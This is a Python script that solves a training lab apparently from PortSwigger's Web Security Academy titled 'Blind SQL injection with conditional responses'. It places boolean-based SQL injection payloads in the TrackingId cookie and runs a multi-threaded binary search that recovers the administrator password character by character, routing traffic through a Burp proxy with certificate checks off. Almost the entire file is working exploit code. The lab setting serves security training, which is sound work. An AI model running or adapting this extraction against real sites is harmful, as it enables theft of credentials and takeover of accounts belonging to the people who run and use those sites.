import sys
import requests
import urllib3
import urllib
import threading
from time import sleep, time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# Simple program to extract password of SQLi-lab-11
# Lab Title: Blind SQL injection with conditional responses
# The technique is Binary Search with multi-threading
# Errors are not checked, if you want to check errors then feel free to update the code as per your needs

# Burp Suite proxy
proxy_urls = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080',
}

# Assume some of the info already known, like password length and table etc.
password_leng = 20 # length of the password
password_leng_range = password_leng + 1
password = [""] * password_leng_range # ignored 0, boc name of threads start from 1

thread_list = []
ascii_val = [*range(48, 58), *range(97, 123)] # list of ascii values [0-9 and a-z] as per lab requirement

# Send request using binary method
def send_req(sn, i, tracking_id, session_id): 
  
  left_p = 0
  right_p = len(ascii_val) - 1

  while True:
    mid = (left_p + right_p) // 2

    # Equal check, always match on mid
    payload = "' AND (SELECT ASCII(SUBSTR(password,%d,1)) FROM users WHERE username='administrator')='%d" %(i, ascii_val[mid])

    payload = urllib.parse.quote_plus(payload)
    
    k_cookie = {"TrackingId": tracking_id + payload, "session": session_id}
    r = sn.get(k_url, cookies=k_cookie, proxies=proxy_urls, verify=False)
    res = r.text

    if 'Welcome back!' in res:
      password[i] = chr(ascii_val[mid])
      break

    # Only check one condition, i am checking < less
    payload = "' AND (SELECT ASCII(SUBSTR(password,%d,1)) FROM users WHERE username='administrator')<'%d" %(i, ascii_val[mid])

    payload = urllib.parse.quote_plus(payload)
    
    k_cookie = {"TrackingId": tracking_id + payload, "session": session_id}
    r = sn.get(k_url, cookies=k_cookie, proxies=proxy_urls, verify=False)
    res = r.text

    # left and right pointers update
    if 'Welcome back!' in res:
      right_p = mid - 1
    else:
      left_p = mid + 1

  
def main():
  print()
  print("[*] Processing...")

  sn = requests.Session()
  
  # Get tracking Id
  r = sn.get(k_url, proxies=proxy_urls, verify=False).cookies.get_dict()
  tracking_id = r['TrackingId']
  session_id = r['session']

  for i in range(1, password_leng_range):
    t = threading.Thread(target=send_req, name="p-%d" %i, args=(sn, i, tracking_id, session_id))
    t.start()
    thread_list.append(t)

  for j in thread_list:    
    j.join()

  print("[-] Password:", "".join(password))
        
  
if __name__ == "__main__":
  # User input URL
  k_url = input("Enter Lab URL: ").strip().rstrip("/")
  
  if not k_url:
    print()
    print("[-] Error! Input variable missing.")
    print("[-] URL: https://a...........c2.web-security-academy.net")
    sys.exit()
  else:
    start_t = time()
    main()
    end_t = time()
    print("[-] Execution Time: %.5f seconds" % (end_t - start_t))
